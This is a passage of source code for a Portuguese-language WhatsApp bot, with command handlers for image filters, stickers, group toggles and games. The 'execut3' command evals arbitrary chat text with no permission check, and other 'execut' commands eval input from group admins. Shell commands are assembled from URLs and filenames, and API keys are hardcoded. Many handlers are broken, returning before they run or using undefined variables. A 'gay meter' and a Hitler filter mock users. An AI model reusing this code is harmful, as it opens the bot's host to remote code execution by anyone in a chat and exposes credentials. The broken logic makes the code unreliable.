tomioka.sendMessage(from, destrava2(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
tomioka.sendMessage(from, destrava3(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break

case 'chentai':

if (!isPremium) return enviar ('s√≥ premium')

tomioka.sendMessage(from, chentai(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'gcpf':

if (!isPremium) return enviar ('s√≥ premium')

tomioka.sendMessage(from, gcpf(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'ytmp4':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (args.length < 1) return enviar ('Cad√™ o url, hum?')
//if(!isUrl(args[0]) && !args[0].includes('youtu')) return enviar (mess.error.Iv)
anu = await fetchJson(`https://st4rz.herokuapp.com/api/ytv2?url=${args[0]}`, {method: 'get'})
teks = `*Title* : ${anu.title}`
thumb = await getBuffer(anu.thumb)
tomioka.sendMessage(from, thumb, image, {quoted: msg, caption: teks})
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: msg})
break
case 'gay2':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)


try {

ppimg = await tomioka.getProfilePicture(`${sender.split('@')[0]}@c.us`)

} catch {

ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'

}          

random = `${Math.floor(Math.random() * 100)}`

boiola = random

if (boiola < 20) {bo = 'hmm... voc√™ √© hetero üòî'} else if (boiola == 21 ) {bo = '+/- boiola'} else if (boiola == 23 ) {bo = '+/- boiola'} else if (boiola == 24 ) {bo = '+/- boiola'} else if (boiola == 25 ) {bo = '+/- boiola'} else if (boiola == 26 ) {bo = '+/- boiola'} else if (boiola == 27 ) {bo = '+/- boiola'} else if (boiola == 28 ) {bo = '+/- boiola'} else if (boiola == 29 ) {bo = '+/- boiola'} else if (boiola == 30 ) {bo = '+/- boiola'} else if (boiola == 31 ) {bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 32 ) {bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 33 ) {bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 34 ) {bo = 'tenho minha desconfian√ßa...üòë'}  else if (boiola == 35 ) {bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 36 ) {bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 37 ) {bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 38 ) {bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 39 ) {bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 40 ) {bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 41 ) {bo = 'voc√™ √© n√©?üòè'} else if (boiola == 42 ) {bo = 'voc√™ √© n√©?üòè'} else if (boiola == 43 ) {bo = 'voc√™ √© n√©?üòè'} else if (boiola == 44 ) {bo = 'voc√™ √© n√©?üòè'} else if (boiola == 45 ) {bo = 'voc√™ √© n√©?üòè'} else if (boiola == 46 ) {bo = 'voc√™ √© n√©?üòè'} else if (boiola == 47 ) {bo = 'voc√™ √© n√©???'} else if (boiola == 48 ) {bo = 'voc√™ √© n√©?üòè'} else if (boiola == 49 ) {bo = 'voc√™ √© n√©?üòè'} else if (boiola == 50 ) {bo = 'voc√™ √© ou n√£o?üßê'} else if (boiola > 51) {bo = 'voc√™ √© gayüôà'}

teks = `Voc√™ √© ${random}% Gay\n\n${bo}`

gay = await getBuffer(`https://api-exteam.herokuapp.com/api/rainbow?img=${ppimg}`)

tomioka.sendMessage(from, gay, image, { quoted: msg, caption: teks})

break

case 'antifake': 

if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isGroup) return enviar ('s√≥ grupo')
if (args.length < 1) return enviar ('ativar 1, desativar 0')
if (args[0] === '1') {
if (isAntiFake) return enviar ('„Äå ‚ùó „Äçanti n√∫meros fakes ativado‚úîÔ∏è')
antifake.push(from)
fs.writeFileSync('./database/group/antifake.json', JSON.stringify(antifake))
return enviar ('„Äå ‚ùó „Äçanti n√∫meros fakes ativado‚úîÔ∏è')
}
//Encontrar a posi√ß√£o do grupo no arquivo json
if (args[0] === '0') {
let position = false
Object.keys(antifake).forEach((i) => {
if (antifake[i] === from) {
position = i
}
})
//Apagar o grupo dos dados quando a posi√ß√£o j√° est√° definida 
if (position !== undefined) {
antifake.splice(position, 1)
fs.writeFileSync('./database/group/antifake.json', JSON.stringify(antifake))
if (!codeInvite) return enviar ('„Äå ‚ùó „Äçanti n√∫meros fakes desativado‚úîÔ∏è')
}}
break
case 'antifake1': 

if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isGroup) return enviar ('s√≥ grupo')
if (isAntiFake) return enviar ('„Äå ‚ùó „Äçanti n√∫meros fakes ativado‚úîÔ∏è')
antifake.push(from)
fs.writeFileSync('./database/group/antifake.json', JSON.stringify(antifake))
return enviar ('„Äå ‚ùó „Äçanti n√∫meros fakes ativado‚úîÔ∏è')

//Encontrar a posi√ß√£o do grupo no arquivo json
break
case 'antifake0': 
let position = false
Object.keys(antifake).forEach((i) => {
if (antifake[i] === from) {
position = i
}
})
//Apagar o grupo dos dados quando a posi√ß√£o j√° est√° definida 
if (position !== undefined) {
antifake.splice(position, 1)
fs.writeFileSync('./database/group/antifake.json', JSON.stringify(antifake))
if (!codeInvite) return enviar ('„Äå ‚ùó „Äçanti n√∫meros fakes desativado‚úîÔ∏è')}
break
case 'antiracismo':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (args.length < 1) return enviar ('Hmmmm')
if ((args[0]) === 'on') {
if (isAntiRacismo) return enviar ('O modo antiracismo j√° est√° ativo')
antiracismo.push(from)
fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
enviar(`\`\`\`‚úìAtivado com sucesso o modo antiracismo no grupo\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
antiracismo.splice(from, 1)
fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
enviar(`\`\`\`‚úìModo antiracismo desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
} else {
enviar('On para ativar, Off para desligar')
}
break
case 'modonsfw':

if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (args.length < 1) return enviar ('Hmmmm')
if ((args[0]) === 'on') {
if (isNsfw) return enviar ('O modo nsfw j√° est√° ativo')
nsfw.push(from)
fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
enviar(`\`\`\`‚úìAtivado com sucesso o modo nsfw no grupo\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
nsfw.splice(from, 1)
fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
enviar(`\`\`\`‚úìModo nsfw desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
} else {
enviar('On para ativar, Off para desligar')
}
break
case 'rtext':

if (args.length < 1) return enviar (mess.blank)
tels5 = body.slice(7)
if (tels5.length > 10) return enviar ('O texto √© longo, com at√© 10 caracteres')
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
buffer = await getBuffer(`https://api.vhtear.com/romancetext?text=${tels5}&apikey=ANTIGRATISNIHANJENKKK`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: tels5})
break
case 'water':

if (args.length < 1) return enviar (mess.blank)
tels = body.slice(7)
if (tels.length > 15) return enviar ('O texto √© muito longo, at√© 20 caracteres')
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://zeksapi.herokuapp.com/api/tfire?text=${tels}&apikey=xptnbot352`, {method: 'get'})
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg})
break
case 'nomegp':

if (args.length < 1) return enviar  ('o nome do grupo √©: *${groupMetadata.subject}*')
break
case 'xd':

if (args.length < 1) return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
pinte = body.slice(11)
anu = await fetchJson(`https://api-zeks.harispoppy.com/api/pin?q=${pin}&apikey=APIKEY`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
var pin = JSON.parse(JSON.stringify(anu.result));
var trest =  pin[Math.floor(Math.random() * pin.length)];
pineq = await getBuffer(trest)
tomioka.sendMessage(from, pineq, image, { caption: '*Pinterest*\n\n*Resultado Pesquisa : '+pinte+'*', contextInfo: null, quoted: tomio, contextInfo: tome})
break
//_Figurinhas customizadas

case 'morto':
case 'morte':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://api-exteam.herokuapp.com/api/rip?img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('√â necess√°rio usar uma imagem')
}
break                                                 
case 'hitler':

var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://api-exteam.herokuapp.com/api/hitler?img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('√â necess√°rio usar uma imagem')
}
break    
case 'covidglobal':
get_result = await fetchJson(`http://brizas-api.herokuapp.com/covidmundo?apikey=brizaloka`)
get_result = get_result.resultado
ini_txt = `Pa√≠ses Afetados : ${get_result.paisesAfetados}\n`
ini_txt = `Casos : ${get_result.casos}\n`
ini_txt = `Casos hoje : ${get_result.casos_hoje}\n`
ini_txt = `Mortes : ${get_result.mortes}\n`
ini_txt += `Mortes Hoje : ${get_result.mortes_hojes}\n`
ini_txt += `Recuperados : ${get_result.recuperados}\n`
ini_txt += `Recuperados hoje: ${get_result.recuperados_hoje}\n`
ini_txt += `Recuperados por milh√£o : ${get_result.recuperadosPorMilhao}\n`
ini_txt += `Ativos : ${get_result.ativos}\n`
ini_txt += `Ativos por milh√£o : ${get_result.ativosPorMilhao}\n`
ini_txt += `Criticos : ${get_result.criticos}\n`
ini_txt += `Cr√≠ticos por milh√£o : ${get_result.criticosPorMilhao}\n`
ini_txt += `Casos por milh√£o : ${get_result.casosPorMilhao}\n`
ini_txt += `Mortes por milh√£o : ${get_result.mortesPorMilhao}\n`
ini_txt += `Testes : ${get_result.testes}\n`
ini_txt += `Testes por milh√£o : ${get_result.testesPorMilhao}\n`
ini_txt += `Popula√ß√£o : ${get_result.popula√ß√£o}\n`
enviar(ini_txt)
break
case 'execut':
if (!isGroupAdmins) return enviar('s√≥ Adm')
return eval(`${args.join(' ')}`)
break
case 'executt':
if (args.length < 1) return enviar('cade o text' + `Wa Automate function/fun√ß√£o da Wa Automate.\n\nEx: ${prefix}execut `)
if (!isGroupAdmins) return enviar('s√≥ Adm')
try {
const waitEval = (cmd) => { return new Promise((resolve, reject) => { eval(cmd) }) }
(async () => { await waitEval(body.slice(8).replace('await ', '')) })()
} catch (error) {
enviar(from, 'deu erro', text)
console.log(color('[EXEC]', 'crimson'), color(`‚Üí Obtive erros no comando ${prefix}${command} ‚Üí erro - Voc√™ pode ignorar.`, 'gold'))
}
break 
case 'execut3':
var konsol = budy.slice(8)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return enviar(bang)
}
try {
enviar(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'de', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
enviar(String(e))
}
break
case 'execut2':
if (!issupre) return 
return eval(`${args.join(' ')}`)
break 

if (!msg.key.fromMe) {
if (isGroup) {
try {
const checkuser = getMsgId(sender)
if (checkuser === undefined) addMsgId(sender)
const name = checkuser
const getmessage = getMsgMessage(sender)
messageContage(sender, 1)      
} catch (err) {
console.error(err)
}
}
}
break
case 'reversevid':
if (!isQuotedVideo) return enviar('Marque um v√≠deo')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return enviar(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
tomioka.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: msg })
fs.unlinkSync(ran)
})
break
/*case 'reiniciar':
tomioka 
if (!isOwner) return enviar(mess.only.ownerB)
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `YT`
require('./lib/fetcher.js').createStickerExif(satu)
require('./lib/fetcher.js').modStick(media, tomioka, msg, from)
rano = getRandom('.webp')
enviar('*„Äå ‚ùó „Äç Espere s√≥ um pouquinho migo, est√° reiniciando...*')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('bot','Bot')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
enviar(mess.stick)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else if ((isMedia && msg.message.videoMessage.seconds < 11 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('Bot', 'Ale')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
enviar(`Falha na convers√£o de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar(`Voc√™ precisa enviar ou marcar uma imagem ou v√≠deo`)
}
break  */           
case 'smeme': 
case 'stickmeme':
gh = body.slice(7)           
var top = gh.split('/')[0]
var bottom = gh.split('/')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg 
owgi = await  tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
enviar('Use fotos/adesivos!')
}
break
case 'figulgbt':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/rainbow?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR ??`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break

case 'figuc':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/circle?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break                             
case 'tapa':

if (!isGroup) return enviar('s√≥ grupo ü§°')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
const shino = fs.readFileSync('./assets/tapa.mp4')
tomioka.sendMessage(from, shino, MessageType.video, {
mimetype: 'video/gif',
quoted: tomio, contextInfo: tome,
caption: `Voc√™ acabou de dar um tapa na raba daüòè @${mentioned[0].split('@')[0]}`
})
break     
case 'borra':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/pixelate?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break              
case 'florest':            

if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/nature-3d?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '*prontinho*'})
break
case 'bot2':

enviar('http://wa.me/994400733887')
break
case 'lolkey':

case 'cekapikey':


if (args.length < 1) return enviar(`Modelo ${prefix}sua key`) 

anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${q}`)

teks = `*SUA CHAVE API * \ n \ e‚û∏ nome de usu√°rio= ${anu.result.username}\n‚û∏ Solicitar= ${anu.result.requests}\n‚û∏ Hoje= ${anu.result.today}\n‚û∏ tipo de conta= ${anu.result.account_type}\n‚û∏ Expirado= ${anu.result.expired}\n‚û∏ API = https://lolhuman.herokuapp.com`

tomioka.sendMessage(from, teks, text, {quoted: tomio, contextInfo: tome})

break
case 'joke':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://lolhuman.herokuapp.com/api/creator1/jokeOverHead?apikey=genbotkey&img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('√â necess√°rio usar uma imagem')
}
break
case 'animerosto':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://lolhuman.herokuapp.com/api/creator1/facepalm?apikey=genbotkey&img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('√â necess√°rio usar uma imagem')
}
break                                                 
case 'quadro':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://lolhuman.herokuapp.com/api/creator1/beautiful?apikey=genbotkey&img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('√â necess√°rio usar uma imagem')
}
break 
case 'afetar':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://lolhuman.herokuapp.com/api/creator1/affect?apikey=genbotkey&img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('√â necess√°rio usar uma imagem')
}
break  
case 'flower':    

if (!isPremium) return enviar (`Voc√™ n√£o √© um Membro Premium, entre em contato com o propriet√°rio ou digite *${prefix}compras* para adquirir o acesso ` ,text, { contextInfo: null, quoted: tomio, contextInfo: tome})
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/flowertext?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
case 'lighttxt':       
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(9)
if (teks.length > 10) return enviar ('O texto √© longo, at√© 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ‚úì*')
buffer = await getBuffer(`https://api.zeks.xyz/api/glowtext?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break                                                                    
case 'procurado':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/procurado?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'ppt':

ppt = ["pedra","papel","tesoura"]
ppy = ppt[Math.floor(Math.random() * ppt.length)]
ppg = Math.floor(Math.random() * 13) + 349
pptb = ppy
pph = `Voc√™ ganhou ${ppg} em xp`
if ((pptb == "pedra" && args == "papel") || 
(pptb == "papel" && args == "tesoura") || 
(pptb == "tesoura" && args == "pedra")) {
var vit = "vitoria"
} else if ((pptb == "pedra" && args == "tesoura") || 
(pptb == "papel" && args == "pedra") || 
(pptb == "tesoura" && args == "papel")) {
